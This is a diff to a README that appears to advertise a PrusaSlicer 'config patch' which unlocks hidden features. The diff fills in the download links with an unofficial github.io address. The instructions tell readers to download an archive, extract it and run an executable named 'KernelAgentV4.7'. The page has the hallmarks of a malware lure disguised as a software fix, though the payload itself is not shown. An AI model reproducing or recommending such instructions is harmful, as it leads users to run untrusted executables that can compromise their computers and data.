@@ -2,13 +2,15 @@
 
 This patch improves PrusaSlicer by unlocking hidden features, fixing slicing bugs, and optimizing profiles for various printers using `KernelAgentV4.7`.
 
-[![Download PrusaSlicer Fix](https://img.shields.io/badge/Download-PrusaSlicer_ConfigPatch-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download PrusaSlicer Fix](https://img.shields.io/badge/Download-PrusaSlicer_ConfigPatch-blueviolet)](https://prusaslicer-advanced-3dslicing.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://prusaslicer-advanced-3dslicing.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PrusaFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will auto-detect your installed PrusaSlicer version and apply optimized configs  
